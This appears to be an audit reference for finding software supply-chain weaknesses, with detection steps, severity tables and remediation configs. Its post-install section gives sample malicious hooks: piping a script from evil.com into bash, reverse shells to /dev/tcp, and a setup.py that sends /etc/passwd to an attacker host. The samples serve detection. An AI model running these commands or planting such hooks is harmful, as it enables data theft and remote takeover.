<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Codex-native BALLS workflow and evidence rules. -->

## Overview

Supply chain vulnerabilities exploit the trust relationships in software dependency ecosystems. Attackers compromise upstream packages, introduce malicious code through dependency confusion, or exploit weaknesses in package management workflows to inject code into target applications. These attacks are particularly dangerous because they bypass traditional application-level security controls and can affect thousands of downstream consumers simultaneously.

## Required dependency evidence

For each dependency concern, identify the manifest declaration, the relevant lockfile or resolved graph, whether the package is direct or transitive, and whether it is runtime or development-only. Do not install packages or claim an installed version from a loose manifest range. A lockfile establishes a repository-pinned resolution, not necessarily what a deployment installed; report that distinction without assuming an external deployment repairs or introduces the issue.

For a CVE claim, record the exact package and version evidence, the advisory's affected/fixed range, and whether the vulnerable feature is enabled or reachable from this codebase when that can be established statically. A package name match or old-looking version is not enough. If the lock/resolution or advisory match cannot be established from repository evidence, retain a needs-validation lead rather than promoting a verified vulnerable dependency. Keep malicious install behavior and registry confusion as separate supply-chain paths with their own source evidence.

## Vulnerability Patterns

### Dependency Confusion / Namespace Conflicts

When a project uses private packages but the package manager also checks public registries, an attacker can publish a higher-versioned package with the same name on the public registry.

**package.json — Private scope missing:**
```json
{
  "dependencies": {
    "internal-auth-lib": "^1.0.0",
    "@company/payments": "^2.3.0"
  }
}
```
The `internal-auth-lib` package has no scope prefix, making it vulnerable to a public registry hijack. `@company/payments` is safer because it uses a scoped namespace.

**pip — No index URL pinning:**
```
# requirements.txt — VULNERABLE
internal-utils==1.2.3
company-auth==0.9.0

# requirements.txt — SAFER
--index-url https://pypi.company.com/simple/
--extra-index-url https://pypi.org/simple/
internal-utils==1.2.3
```

**Go — Module path confusion:**
```go
// go.mod — VULNERABLE: no replace directive for internal modules
module company.com/app

require (
    github.com/company/internal-pkg v1.0.0
)

// go.mod — SAFER: replace directive pins internal module
module company.com/app

require (
    company.com/internal-pkg v1.0.0
)

replace company.com/internal-pkg => ../internal-pkg
```

### Typosquatting Patterns

```
# Common typosquatting patterns to detect:
# Original         → Typosquat
lodash             → lodahs, l0dash, lodash-utils
express            → expresss, expres, express-framework
requests           → reqeusts, request, python-requests
django             → djang0, djangoo
flask              → flaask, flask-core
numpy              → numppy, numpi
```

### Post-Install Script Abuse

**package.json — Suspicious lifecycle scripts:**
```json
{
  "name": "helpful-package",
  "scripts": {
    "preinstall": "curl https://evil.com/payload.sh | bash",
    "postinstall": "node ./scripts/setup.js",
    "install": "python -c \"import os; os.system('wget ...')\"",
    "prepare": "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
  }
}
```

**setup.py — Malicious install commands:**
```python
# setup.py — SUSPICIOUS patterns
from setuptools import setup
from setuptools.command.install import install
import subprocess, os, socket

class CustomInstall(install):
    def run(self):
        # Exfiltration during install
        subprocess.call(['curl', '-d', '@/etc/passwd', 'https://evil.com/collect'])
        # Reverse shell
        os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')
        install.run(self)

setup(
    name='helpful-tool',
    cmdclass={'install': CustomInstall},
)
```

**Gemfile — Post-install hooks:**
```ruby
# Gemfile with suspicious extensions
gem 'useful-gem', git: 'https://github.com/attacker/useful-gem.git'

# gems with native extensions can execute arbitrary code at install time
gem 'native-exploit', require: false
```

### Lockfile Manipulation

**package-lock.json — Integrity hash mismatch:**
```json
{
  "name": "my-app",
  "lockfileVersion": 2,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-TAMPERED_HASH_VALUE"
    }
  }
}
```

**Cargo.lock — Suspicious source replacement:**
```toml
[[package]]
name = "serde"
version = "1.0.130"
source = "registry+https://attacker-registry.com/index"
```

### Outdated Dependencies with Known CVEs

```json
// package.json — Dependencies with known CVEs
{
  "dependencies": {
    "lodash": "4.17.15",           // CVE-2020-8203, CVE-2021-23337
    "minimist": "0.0.8",           // CVE-2021-44906
    "node-fetch": "2.6.0",         // CVE-2022-0235
    "express": "4.16.0",           // Multiple CVEs
    "jsonwebtoken": "8.5.0",       // CVE-2022-23529
    "xml2js": "0.4.19"             // CVE-2023-0842
  }
}
```

```xml
<!-- pom.xml — Dependencies with known CVEs -->
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version> <!-- CVE-2021-44228 Log4Shell -->
    </dependency>
    <dependency>
        <groupId>com.fasterxml.jackson.core</groupId>
        <artifactId>jackson-databind</artifactId>
        <version>2.9.8</version> <!-- Multiple deserialization CVEs -->
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>5.2.0.RELEASE</version> <!-- CVE-2022-22965 Spring4Shell -->
    </dependency>
</dependencies>
```

```python
# requirements.txt — Outdated dependencies
Django==2.2.0               # CVE-2021-33203, many others
Pillow==8.0.0               # CVE-2021-25287, CVE-2021-25288
cryptography==3.3           # CVE-2023-23931
PyYAML==5.3                 # CVE-2020-14343
urllib3==1.25.0             # CVE-2021-33503
```

### Vendored Dependency Tampering

```
# Check vendored directories for unexpected modifications
vendor/
node_modules/ (committed to repo)
third_party/
lib/external/
```

## Detection Methodology

1. **Manifest and Resolution Analysis**: Parse package manifests and matching lockfiles; record exact pins, ranges, direct/transitive status, and runtime/development classification where the repository establishes it
2. **Namespace Validation**: Check for unscoped private packages that could be hijacked on public registries
3. **Lockfile Integrity**: Verify lockfiles exist, are committed, and match manifests — check for integrity hash anomalies
4. **Post-Install Script Audit**: Examine all lifecycle scripts for network calls, shell execution, or encoded payloads
5. **Typosquatting Detection**: Compare dependency names against known popular packages for near-matches
6. **Version Pinning Check**: Identify unpinned or loosely pinned dependencies (use of `*`, `latest`, `>=` without upper bound)
7. **Source Verification**: Check that package sources point to expected registries, not attacker-controlled mirrors
8. **Vendored Code Audit**: Compare vendored dependencies against their published versions for tampering
9. **SBOM Generation**: Enumerate all transitive dependencies and check against vulnerability databases
10. **Git History Analysis**: Check for sudden dependency changes in pull requests, especially from new contributors

## Common Sinks and Sources

### Package Manifest Files
- `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- `requirements.txt`, `Pipfile`, `Pipfile.lock`, `setup.py`, `setup.cfg`, `pyproject.toml`
- `Cargo.toml`, `Cargo.lock`
- `go.mod`, `go.sum`
- `pom.xml`, `build.gradle`, `build.gradle.kts`
- `Gemfile`, `Gemfile.lock`
- `.csproj`, `packages.config`, `Directory.Packages.props`
- `composer.json`, `composer.lock`

### Registry Configuration
- `.npmrc` — `registry=`, `@scope:registry=`
- `.pypirc`, `pip.conf` — `index-url`, `extra-index-url`
- `NuGet.config` — `<packageSources>`
- `.cargo/config.toml` — `[registries]`
- `GOPROXY` environment variable

### CI/CD Pipeline Files
- `.github/workflows/*.yml`
- `.gitlab-ci.yml`
- `Jenkinsfile`
- `.circleci/config.yml`
- `azure-pipelines.yml`

## False Positive Indicators

- **Scoped packages**: `@company/package-name` with a properly configured private registry are not dependency confusion
- **Version ranges with lockfiles**: A range can be reproducible when a matching lockfile is committed and the repository-defined install path enforces it; verify those conditions rather than assuming them
- **Development dependencies**: Some lifecycle scripts in devDependencies (like `husky` pre-commit hooks) are expected
- **Known build tools**: `node-gyp`, `prebuild-install`, and similar tools legitimately run native compilation during install
- **Placeholder/example configs**: Files in documentation directories or example folders are not production manifests
- **Monorepo internal references**: Workspace references (`workspace:*`, `file:../packages/lib`) are not dependency confusion
- **Fork references**: `"package": "github:company/fork#branch"` may be intentional forks, not hijacks

## Severity Assessment

| Finding | Severity |
|---------|----------|
| Active dependency confusion (unscoped private package with public match) | **Critical** |
| Post-install script with network calls or shell execution | **Critical** |
| Verified critical-severity CVE in a repository-resolved runtime dependency with an applicable vulnerable feature | **Critical** |
| Missing lockfile for a deployable application where reproducible dependency resolution is required by repository policy | **Assess project context; commonly High** |
| Lockfile integrity hash mismatch | **High** |
| Typosquatting match on dependency name | **High** |
| Verified high-severity CVE in a repository-resolved runtime dependency with an applicable vulnerable feature | **High** |
| Unpinned dependency versions (`*`, `latest`) | **Medium** |
| Verified CVE in a repository-resolved development dependency that affects a reachable build/CI workflow | **Assess build impact** |
| Outdated dependencies without known CVEs | **Low** |
| Missing SBOM or dependency inventory | **Low** |

## Remediation Patterns

### Scoped Packages (npm)
```json
{
  "dependencies": {
    "@company/internal-auth-lib": "^1.0.0"
  }
}
```

### Registry Pinning (.npmrc)
```ini
@company:registry=https://npm.company.com/
registry=https://registry.npmjs.org/
```

### pip Index Pinning
```
# requirements.txt
--index-url https://pypi.company.com/simple/
--extra-index-url https://pypi.org/simple/
company-auth==1.2.3 --hash=sha256:abc123...
```

### Lockfile Enforcement
```yaml
# .github/workflows/ci.yml
- name: Install dependencies (frozen lockfile)
  run: npm ci  # NOT npm install
  # or: yarn install --frozen-lockfile
  # or: pip install --require-hashes -r requirements.txt
```

### Disable Lifecycle Scripts
```ini
# .npmrc
ignore-scripts=true
```

```bash
# Install with scripts disabled, then audit
npm install --ignore-scripts
npm audit
```

### Go Module Verification
```go
// go.mod
module company.com/app

go 1.21

require (
    company.com/internal-pkg v1.0.0
)

replace company.com/internal-pkg => ../internal-pkg
```

```bash
# Verify go.sum integrity
go mod verify
GONOSUMCHECK=company.com/internal/* go mod download
```

### Dependency Pinning with Hashes
```
# requirements.txt with hash verification
Django==4.2.7 \
    --hash=sha256:abc123def456... \
    --hash=sha256:789ghi012jkl...
```

### SBOM Generation
```bash
# npm
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Python
pip install cyclonedx-bom
cyclonedx-py requirements -i requirements.txt -o sbom.json

# Go
go install github.com/CycloneDX/cyclonedx-gomod/cmd/cyclonedx-gomod@latest
cyclonedx-gomod mod -output sbom.json
```

## CWE References

- **CWE-1104**: Use of Unmaintained Third-Party Components
- **CWE-829**: Inclusion of Functionality from Untrusted Control Sphere
- **CWE-494**: Download of Code Without Integrity Check
- **CWE-506**: Embedded Malicious Code
- **CWE-1035**: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities
- **CWE-937**: Using Components with Known Vulnerabilities (NVD)
- **CWE-426**: Untrusted Search Path
- **CWE-427**: Uncontrolled Search Path Element
- **CWE-669**: Incorrect Resource Transfer Between Spheres
- **CWE-1357**: Reliance on Insufficiently Trustworthy Component
